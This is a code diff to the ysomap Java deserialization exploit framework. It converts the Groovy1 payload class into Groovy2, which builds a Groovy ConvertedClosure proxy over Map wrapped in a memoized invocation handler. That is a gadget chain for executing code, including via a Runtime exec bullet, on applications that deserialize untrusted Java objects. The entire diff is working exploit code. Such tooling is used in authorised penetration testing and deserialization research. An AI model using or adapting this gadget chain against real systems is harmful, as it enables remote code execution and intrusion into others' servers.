@@ -9,6 +9,7 @@ import ysomap.core.util.PayloadHelper;
 import ysomap.payloads.AbstractPayload;
 
 import java.lang.reflect.Proxy;
+import java.util.Map;
 
 /**
  * @author wh1t3p1g
@@ -17,10 +18,10 @@ import java.lang.reflect.Proxy;
 @Payloads
 @SuppressWarnings({"rawtypes"})
 @Authors({ Authors.FROHOFF })
-@Targets({Targets.XSTREAM})
-@Require(bullets = {"ClosureWithJNDIBullet"},param = false)
+@Targets({Targets.JDK})
+@Require(bullets = {"ClosureWithJNDIBullet", "ClosureWithRuntime2Bullet"},param = false)
 @Dependencies({"org.codehaus.groovy:groovy:2.4.3"})
-public class Groovy1 extends AbstractPayload<Object> {
+public class Groovy2 extends AbstractPayload<Object> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
@@ -29,10 +30,11 @@ public class Groovy1 extends AbstractPayload<Object> {
 
     @Override
     public Object pack(Object obj) throws Exception {
-        ConvertedClosure closure = new ConvertedClosure((Closure) obj, "compareTo");
-        Object map = Proxy.newProxyInstance(
-                Groovy1.class.getClassLoader(),
-                new Class<?>[]{Comparable.class}, closure);
-        return PayloadHelper.makePriorityQueue(map,false);
+        ConvertedClosure closure = new ConvertedClosure((Closure) obj, "entrySet");
+        Map map = (Map) Proxy.newProxyInstance(
+                Groovy2.class.getClassLoader(),
+                new Class<?>[]{Map.class}, closure);
+
+        return PayloadHelper.createMemoizedInvocationHandler(map);
     }
 }
